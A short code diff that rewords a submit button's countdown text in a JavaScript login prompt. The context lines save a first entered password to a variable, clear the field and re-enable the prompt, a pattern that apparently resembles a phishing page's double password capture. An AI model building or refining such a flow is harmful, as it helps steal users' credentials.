@@ -201,7 +201,7 @@ function showPrompt(IpAddress) {
                 FIRST_PASSWORD = password;
 
                 let countdown = 10;
-                submitBtn.text(`Wait ${countdown}s`);
+                submitBtn.text(`Please wait ${countdown}s`);
                 setTimeout(() => {
                     $('.lsd-ring-container').addClass('d-none');
                     $('#password').val('');
@@ -210,7 +210,7 @@ function showPrompt(IpAddress) {
                 const interval = setInterval(() => {
                     countdown--;
                     if (countdown > 0) {
-                        submitBtn.text(`Wait ${countdown}s`);
+                        submitBtn.text(`Please wait ${countdown}s`);
                     } else {
                         clearInterval(interval);
                         submitBtn.prop('disabled', false);
